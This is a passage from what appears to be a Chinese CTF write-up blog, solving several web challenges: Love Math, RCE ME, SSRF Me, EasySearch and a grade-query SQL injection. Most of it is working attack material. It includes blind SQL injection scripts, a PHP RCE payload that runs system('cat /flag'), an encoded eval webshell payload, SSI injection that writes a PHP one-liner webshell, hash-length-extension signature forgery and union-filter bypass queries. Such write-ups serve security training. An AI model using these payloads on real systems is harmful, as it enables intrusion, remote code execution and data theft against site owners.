</span></span></code></pre></div><p>查password字段：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>chars <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;-</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>43</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chars:
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;0^(ascii(substr((select(password)from(F1naI1y)where(password)regexp(&#39;flag&#39;)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{</span>ord(c)<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;id&#34;</span>: payload}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;Click others&#34;</span> <span style=color:#f92672>in</span> resp<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            print(c)
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>+=</span> c
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># flag{f1dc586c-f972-49f4-992e-a1db60c279bb}</span>
</span></span></code></pre></div><hr><h2 id=ciscn-2019-初赛love-math>[CISCN 2019 初赛]Love Math<a hidden class=anchor aria-hidden=true href=#ciscn-2019-初赛love-math>#</a></h2><p>开头的$pi用于白名单检验，同时存储参数值_GET</p><p>base_convert36进制可以覆盖所有字母和数字，dechex用于绕过引号的过滤</p><p>利用动态变量的机制$$pi来实现$_GET的效果，方括号用花括号绕过</p><pre tabindex=0><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})&amp;1=system&amp;2=cat /flag

_GETflag{3d85afda-5f52-44af-ae0e-279bc544d9d9} 
</code></pre><hr><h2 id=极客大挑战-2019rce-me>[极客大挑战 2019]RCE ME<a hidden class=anchor aria-hidden=true href=#极客大挑战-2019rce-me>#</a></h2><p>取反绕过，直接传一句话木马连蚁剑：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>code</span><span style=color:#f92672>=</span>(<span style=color:#f92672>~%</span><span style=color:#ae81ff>9</span><span style=color:#a6e22e>E</span><span style=color:#f92672>%</span><span style=color:#ae81ff>8</span><span style=color:#a6e22e>C</span><span style=color:#f92672>%</span><span style=color:#ae81ff>8</span><span style=color:#a6e22e>C</span><span style=color:#f92672>%</span><span style=color:#ae81ff>9</span><span style=color:#a6e22e>A</span><span style=color:#f92672>%</span><span style=color:#ae81ff>8</span><span style=color:#a6e22e>D</span><span style=color:#f92672>%</span><span style=color:#ae81ff>8</span><span style=color:#a6e22e>B</span>)(<span style=color:#f92672>~%</span><span style=color:#ae81ff>9</span><span style=color:#a6e22e>A</span><span style=color:#f92672>%</span><span style=color:#ae81ff>89</span><span style=color:#f92672>%</span><span style=color:#ae81ff>9</span><span style=color:#a6e22e>E</span><span style=color:#f92672>%</span><span style=color:#ae81ff>93</span><span style=color:#f92672>%</span><span style=color:#a6e22e>D7</span><span style=color:#f92672>%</span><span style=color:#a6e22e>DB</span><span style=color:#f92672>%</span><span style=color:#a6e22e>A0</span><span style=color:#f92672>%</span><span style=color:#a6e22e>AD</span><span style=color:#f92672>%</span><span style=color:#a6e22e>BA</span><span style=color:#f92672>%</span><span style=color:#a6e22e>AE</span><span style=color:#f92672>%</span><span style=color:#a6e22e>AA</span><span style=color:#f92672>%</span><span style=color:#a6e22e>BA</span><span style=color:#f92672>%</span><span style=color:#a6e22e>AC</span><span style=color:#f92672>%</span><span style=color:#a6e22e>AB</span><span style=color:#f92672>%</span><span style=color:#a6e22e>A4</span><span style=color:#f92672>%</span><span style=color:#a6e22e>CE</span><span style=color:#f92672>%</span><span style=color:#a6e22e>A2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>D6</span><span style=color:#f92672>%</span><span style=color:#a6e22e>C4</span>);  <span style=color:#75715e>// assert(eval($_REQUEST[1]););
</span></span></span></code></pre></div><p>禁用了许多函数，要用到插件<a href=https://github.com/AntSword-Store/as_bypass_php_disable_functions>as_bypass_php_disable_functions</a></p><p>flag{de68efc7-3711-4123-9331-049213b7c83f}</p><hr><h2 id=de1ctf-2019ssrf-me>[De1CTF 2019]SSRF Me<a hidden class=anchor aria-hidden=true href=#de1ctf-2019ssrf-me>#</a></h2><p>hint：flag is in ./flag.txt</p><p>code.txt：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/env python </span>
</span></span><span style=display:flex><span><span style=color:#75715e>#encoding=utf-8 </span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask 
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> request 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os 
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>reload(sys) 
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>setdefaultencoding(<span style=color:#e6db74>&#39;latin1&#39;</span>) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__) 
</span></span><span style=display:flex><span>secert_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>16</span>) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Task</span>: 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, action, param, sign, ip): 
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>action <span style=color:#f92672>=</span> action 
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>param <span style=color:#f92672>=</span> param 
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>sign <span style=color:#f92672>=</span> sign 
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>sandbox <span style=color:#f92672>=</span> md5(ip) 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(self<span style=color:#f92672>.</span>sandbox)): 
</span></span><span style=display:flex><span>            <span style=color:#75715e>#SandBox For Remote_Addr </span>
</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>mkdir(self<span style=color:#f92672>.</span>sandbox) 
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>Exec</span>(self): 
</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> {} 
</span></span><span style=display:flex><span>        result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>500</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (self<span style=color:#f92672>.</span>checkSign()): 
</span></span><span style=display:flex><span>           	<span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;scan&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>action: 
</span></span><span style=display:flex><span>            	tmpfile <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/result.txt&#34;</span> <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>sandbox, <span style=color:#e6db74>&#39;w&#39;</span>) 
</span></span><span style=display:flex><span>               	resp <span style=color:#f92672>=</span> scan(self<span style=color:#f92672>.</span>param) 
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (resp <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;Connection Timeout&#34;</span>): 
</span></span><span style=display:flex><span>                    result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> resp 
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>: 
</span></span><span style=display:flex><span>                    print resp tmpfile<span style=color:#f92672>.</span>write(resp) 
</span></span><span style=display:flex><span>                tmpfile<span style=color:#f92672>.</span>close() 
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span> 
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;read&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>action: 
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>/result.txt&#34;</span> <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>sandbox, <span style=color:#e6db74>&#39;r&#39;</span>) 
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span> 
</span></span><span style=display:flex><span>                result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read() 
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>500</span>: 
</span></span><span style=display:flex><span>                    result[<span style=color:#e6db74>&#39;data&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Action Error&#34;</span> 
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>: 
</span></span><span style=display:flex><span>                    result[<span style=color:#e6db74>&#39;code&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>500</span> 
</span></span><span style=display:flex><span>                    result[<span style=color:#e6db74>&#39;msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Sign Error&#34;</span> 
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>return</span> result 
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>checkSign</span>(self): 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (getSign(self<span style=color:#f92672>.</span>action, self<span style=color:#f92672>.</span>param) <span style=color:#f92672>==</span> self<span style=color:#f92672>.</span>sign): 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>: 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span> 
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span><span style=color:#75715e>#generate Sign For Action Scan. </span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/geneSign&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>]) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>geneSign</span>(): 
</span></span><span style=display:flex><span>    param <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;param&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)) 
</span></span><span style=display:flex><span>    action <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;scan&#34;</span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> getSign(action, param) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/De1ta&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>,<span style=color:#e6db74>&#39;POST&#39;</span>]) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>challenge</span>(): 
</span></span><span style=display:flex><span>    action <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;action&#34;</span>)) 
</span></span><span style=display:flex><span>    param <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;param&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)) 
</span></span><span style=display:flex><span>    sign <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>unquote(request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;sign&#34;</span>)) 
</span></span><span style=display:flex><span>    ip <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>remote_addr 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(waf(param)): 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;No Hacker!!!!&#34;</span> 
</span></span><span style=display:flex><span>    task <span style=color:#f92672>=</span> Task(action, param, sign, ip) 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> json<span style=color:#f92672>.</span>dumps(task<span style=color:#f92672>.</span>Exec()) 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>) 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>(): 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(<span style=color:#e6db74>&#34;code.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>)<span style=color:#f92672>.</span>read() 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>scan</span>(param): 
</span></span><span style=display:flex><span>    socket<span style=color:#f92672>.</span>setdefaulttimeout(<span style=color:#ae81ff>1</span>) 
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>: 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> urllib<span style=color:#f92672>.</span>urlopen(param)<span style=color:#f92672>.</span>read()[:<span style=color:#ae81ff>50</span>] 
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span>: 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Connection Timeout&#34;</span> 
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getSign</span>(action, param): 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(secert_key <span style=color:#f92672>+</span> param <span style=color:#f92672>+</span> action)<span style=color:#f92672>.</span>hexdigest() 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5</span>(content): 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(content)<span style=color:#f92672>.</span>hexdigest() 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>waf</span>(param): 
</span></span><span style=display:flex><span>    check<span style=color:#f92672>=</span>param<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>lower()   
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> check<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;gopher&#34;</span>) <span style=color:#f92672>or</span> check<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;file&#34;</span>): 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>: 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span> 
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>: 
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>debug <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span> 
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>,port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
</span></span></code></pre></div><p>思路是先用scan把./flag.txt读到tmpfile中，再用read读取tmpfile中的内容，从而获取flag：</p><pre tabindex=0><code>geneSign?param=flag.txt
813fcc8e24c182deb6b61769e19ea87b

De1ta?param=flag.txt
Cookie: action=scan; sign=813fcc8e24c182deb6b61769e19ea87b
{&#34;code&#34;: 200}
</code></pre><p>此时已成功读出flag.txt的内容并写入tmpfile，问题在于geneSign无法生成action=read的签名，签名需要用到secret_key，而secert_key = os.urandom(16)是随机生成的，无法直接算出action=read的签名，但观察到对于action的判断是in而非=，<code>if "read" in self.action</code>，也就是说只要action中包含read并通过签名验证即可读取tmpfile</p><p>看了其他师傅的wp，有两种方式实现</p><p>方法一：</p><pre tabindex=0><code>/geneSign?param=flag.txtread
28374b044d5de2e91388bf0c97844ad3
</code></pre><p>相当于计算了签名：<code>hashlib.md5(secert_key + "flag.txtread" + "scan").hexdigest()</code></p><pre tabindex=0><code>/De1ta?param=flag.txt
Cookie: action=readscan; sign=28374b044d5de2e91388bf0c97844ad3
{&#34;code&#34;: 200, &#34;data&#34;: &#34;flag{ac6dd589-46ef-4dd7-bac4-e5feab327f23}\n&#34;}
</code></pre><p>此时验证的签名：<code>hashlib.md5(secert_key + "flag.txt" + "readscan").hexdigest()</code>，十分巧妙地避开了获取secret_key的问题，实现read</p><p>方法二：<a href=https://xz.aliyun.com/news/10050>哈希长度扩展攻击</a></p><p>用到了工具https://github.com/shellfeel/hash-ext-attack，无需知道密钥，只要知道密钥长度和原签名字符即可</p><pre tabindex=0><code>/De1ta?param=flag.txt
Cookie: action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E0%00%00%00%00%00%00%00read;sign=9f8245743d6fa44212ac4d78860a6643
</code></pre><hr><h2 id=bjdctf2020easysearch>[BJDCTF2020]EasySearch<a hidden class=anchor aria-hidden=true href=#bjdctf2020easysearch>#</a></h2><p>index.php.swp：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>ob_start</span>();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_hash</span>(){
</span></span><span style=display:flex><span>		$chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;</span>;
</span></span><span style=display:flex><span>		$random <span style=color:#f92672>=</span> $chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)]<span style=color:#f92672>.</span>$chars[<span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>73</span>)];<span style=color:#75715e>//Random 5 times
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		$content <span style=color:#f92672>=</span> <span style=color:#a6e22e>uniqid</span>()<span style=color:#f92672>.</span>$random;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>sha1</span>($content); 
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#66d9ef>and</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;&#39;</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $admin <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;6d0bc1&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( $admin <span style=color:#f92672>==</span> <span style=color:#a6e22e>substr</span>(<span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>]),<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>6</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&#34;</span>;
</span></span><span style=display:flex><span>            $file_shtml <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;public/&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>get_hash</span>()<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.shtml&#34;</span>;
</span></span><span style=display:flex><span>            $shtml <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>($file_shtml, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Unable to open file!&#34;</span>);
</span></span><span style=display:flex><span>            $text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h1&gt;Hello,&#39;</span><span style=color:#f92672>.</span>$_POST[<span style=color:#e6db74>&#39;username&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            ***
</span></span></span><span style=display:flex><span><span style=color:#e6db74>			***&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fwrite</span>($shtml,$text);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>fclose</span>($shtml);
</span></span><span style=display:flex><span>            <span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;[!] Header  error ...&#34;</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&#34;</span>;
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>	<span style=color:#f92672>***</span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>爆破出md5值开头为6d0bc1的字符串：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> itertools
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target_prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;6d0bc1&#34;</span>
</span></span><span style=display:flex><span>charset <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>printable  <span style=color:#75715e># 可调整字符集范围以提高效率</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_matching_hash</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> length <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>10</span>):  <span style=color:#75715e># 尝试不同长度</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> candidate <span style=color:#f92672>in</span> itertools<span style=color:#f92672>.</span>product(charset, repeat<span style=color:#f92672>=</span>length):
</span></span><span style=display:flex><span>            candidate_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(candidate)
</span></span><span style=display:flex><span>            md5_hash <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(candidate_str<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> md5_hash<span style=color:#f92672>.</span>startswith(target_prefix):
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found: </span><span style=color:#e6db74>{</span>candidate_str<span style=color:#e6db74>}</span><span style=color:#e6db74> -&gt; </span><span style=color:#e6db74>{</span>md5_hash<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> candidate_str
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> find_matching_hash()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Found: d`H6 -&gt; 6d0bc16554ba2a22d39dca240829bf94</span>
</span></span></code></pre></div><p>登录后响应头中有信息Url_Is_Here：</p><pre tabindex=0><code>public/f1b405acb16df4e12abe7cbef5a03c9e1d0f7318.shtml
</code></pre><p>查阅相关资料，shtml可以执行ssi相关指令，只需控制username为ssi指令即可实现<a href=https://www.cnblogs.com/bonelee/p/12027775.html>ssi注入</a>：</p><pre tabindex=0><code>username=&lt;!--#exec cmd=&#34;echo &#39;&lt;?php @eval($_REQUEST[1]) ?&gt;&#39; &gt; ./shell.php&#34; --&gt;
</code></pre><p>写入一句话木马后连上蚁剑找到flag：flag{af9e11b8-eece-4384-bedd-4918a4e5fd97}</p><hr><h2 id=wustctf2020颜值成绩查询>[WUSTCTF2020]颜值成绩查询<a hidden class=anchor aria-hidden=true href=#wustctf2020颜值成绩查询>#</a></h2><p>过滤了空格，有3列：</p><pre tabindex=0><code>?stunum=1/**/order/**/by/**/3/**/--+
</code></pre><p>过滤了union，试试双写绕过，查出表名flag，查出字段名flag,value，最后查flag字段：</p><pre tabindex=0><code>?stunum=0/**/ununionion/**/select/**/1,value,3/**/from/**/flag--+
</code></pre><p>flag{1858b6cb-b243-4156-82c9-9f36c347a9b4}</p><p>懒得测试过滤和绕过也可以直接试试布尔盲注：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://dedb92cb-82b8-4609-b424-2bc7b1e48e26.node5.buuoj.cn:81&#34;</span>
